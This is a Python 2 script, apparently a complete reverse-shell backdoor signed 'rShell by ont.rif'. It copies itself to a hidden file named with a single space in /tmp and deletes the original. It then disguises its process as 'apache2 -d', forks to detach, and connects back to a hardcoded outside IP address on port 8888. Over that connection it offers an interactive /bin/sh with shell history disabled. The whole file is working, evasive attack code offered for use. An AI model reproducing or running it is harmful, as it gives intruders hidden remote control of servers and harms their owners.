#!/usr/bin/env python
import sys, socket, os
import pty, fcntl, struct, termios, select, resource

pybin = '/usr/bin/python2'    ## path to python on server
name = 'apache2 -d'           ## fake name for our process (can contain spaces & fake args)
host = '95.181.93.72'         ## HOST to connect to
port = 8888                   ## PORT to connect to


our_path = os.path.abspath( __file__ )                   ## path to this script
open( '/tmp/ ', 'w' ).write( open( our_path ).read() )   ## make copy to filename <<space>>
os.unlink( our_path )                                    ## first time it delete shell.py and second time <<space>> file

if len( sys.argv ) < 2:                                  ## is here special hidden arg <<space>> ?
    os.chdir( '/tmp' )                                   ## chdir to tmp to avoid '/tmp' part in process list
    os.execv( pybin, [ name, ' ', ' ' ] )                ## exec python /tmp/<<space>> <<space>>

try:                                                     ## creating socket & connecting...
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    sock.connect( (host, port) )
    fsock = sock.fileno()
except:
    print "[!] Can't connect !\n"
    exit( 0 )

if os.fork() > 0: exit( 0 )                              ## forking for deattaching from main thread
if os.fork() > 0: exit( 0 )                              ## ...

os.dup2( fsock, sys.stdin.fileno()  )
os.dup2( fsock, sys.stdout.fileno() )
os.dup2( fsock, sys.stderr.fileno() )
sock.sendall( ('\r\n>>>>>>>>>>>>>>> rShell by ont.rif >>>>>>>>>>>>>>\r\n') )

sys.stdout.write( "[!] %s\r\n" % sys.version )

pid, fpty = pty.fork()
if not pid: # Child
    try:
        TIOCSWINSZ = getattr(termios, 'TIOCSWINSZ', -2146929561)
        if TIOCSWINSZ == 2148037735L:
            TIOCSWINSZ = -2146929561
        s = struct.pack('HHHH', 36, 111, 0, 0)           ## terminal size = 111 x 36
        fcntl.ioctl( sys.stdout.fileno(), TIOCSWINSZ, s )
    except:
        pass

    os.execve( '/bin/sh', [ name ], { 'HISTFILE' : '', 'TERM' : 'linux' } )  ## bash with usefull env vars


while True:
    r, w, e = select.select( [ fpty, fsock ], [], [], 5 )

    if fpty in r:
        try:
            res = os.read( fpty, 100000 )
            os.write( fsock, res )
        except:
            print "[!] Die (child time out)......\r"
            exit( 0 )

    if fsock in r:
        res = os.read( fsock, 1000 )
        os.write( fpty, res )
        if not res:
            print "[!] Die (empty socket)....\r"
            exit( 0 )

    os.write( fsock, '\x01' )  ## magic byte (to avoid timeouts)
